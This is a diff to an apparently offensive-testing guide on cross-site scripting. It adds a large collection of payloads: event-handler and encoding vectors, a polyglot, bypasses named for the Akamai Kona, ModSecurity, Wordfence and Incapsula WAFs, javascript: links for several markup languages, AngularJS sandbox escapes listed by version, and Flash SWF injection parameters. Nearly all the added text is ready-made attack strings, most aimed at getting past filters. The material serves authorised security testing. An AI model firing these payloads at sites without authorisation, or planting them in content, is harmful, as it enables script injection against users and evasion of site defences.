@@ -88,6 +88,8 @@ Always test cross-origin postMessage handlers.
 <iframe srcdoc="<script>alert(1)</script>">
 <a href="javascript:alert(1)">x</a>
 <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<meter onmouseover="alert(1)"
+>><marquee loop=1 width=0 onfinish=alert(1)>
 ```
 
 Encoding tricks:
@@ -96,6 +98,21 @@ Encoding tricks:
 <svg/onload=alert&NewLine;(1)>
 <svg onload="alert&lpar;1&rpar;">
 <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+```
+
+Unicode bypass:
+```
+†‡•＜img src=a onerror=javascript:alert('test')>…‰€
+```
+
+URL context bypass (works without `&#x09;` too):
+```
+javas&#x09;cript://www.google.com/%0Aalert(1)
+```
+
+XSS Polyglot:
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
 Event handler fuzzing: [PortSwigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
@@ -124,6 +141,130 @@ Don't stop at alert — demonstrate real impact:
 - Internal SSRF via XHR to admin APIs.
 
 Use an exfil endpoint you control for PoC; don't mass-collect real user data.
+
+## WAF-specific bypasses
+
+**Kona WAF (Akamai)**
+```
+\');confirm(1);//
+```
+
+**ModSecurity** — repeat onerror to confuse parser:
+```html
+<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+```
+
+**Wordfence**
+```html
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+```
+
+**Incapsula**
+```html
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+```
+
+## Markdown / markup XSS
+
+Works in Markdown renderers that don't strip `javascript:` hrefs:
+```md
+[a](javascript:confirm(1))
+[a](javascript://www.google.com%0Aprompt(1))
+[a](javascript://%0d%0aconfirm(1))
+[a](javascript:window.onerror=confirm;throw%201)
+[a]: (javascript:prompt(1))
+```
+
+RubyDoc (.rdoc):
+```rdoc
+XSS[JavaScript:alert(1)]
+```
+
+Textile:
+```textile
+"Test link":javascript:alert(1)
+```
+
+reStructuredText:
+```rst
+`Test link`__.
+
+__ javascript:alert(document.domain)
+```
+
+## AngularJS sandbox escapes (by version)
+
+Check `angular.version` in the browser console to confirm version.
+
+**1.0.1 – 1.1.5**
+```js
+{{constructor.constructor('alert(1)')()}}
+```
+
+**1.2.0 – 1.2.1**
+```js
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+```
+
+**1.2.6 – 1.2.18**
+```js
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+```
+
+**1.2.19 – 1.2.23**
+```js
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+```
+
+**1.2.24 – 1.2.29**
+```js
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+```
+
+**1.3.1 – 1.3.2**
+```js
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}
+```
+
+**1.3.3 – 1.3.18**
+```js
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
+```
+
+**1.3.20**
+```js
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+```
+
+**1.4.0 – 1.4.9**
+```js
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+```
+
+**1.5.0 – 1.5.8**
+```js
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+```
+
+**1.6.0+ (no sandbox)**
+```js
+{{constructor.constructor('alert(1)')()}}
+```
+
+## Flash SWF XSS (legacy, Flash EOL 2020)
+
+Still relevant for old intranet apps and legacy bug bounty programs:
+
+- `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`
+- `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`
+- `flashmediaelement.swf?jsinitfunctio%gn=alert\`1\``
+- `video-js.swf?readyFunction=confirm`
+- `io.swf?yid=\"));}catch(e){alert(document.domain);}//`
+- `banner.swf?clickTAG=javascript:alert(document.domain);//`
+- `player.swf?playerready=alert(document.domain)`
 
 ## Remediation
 
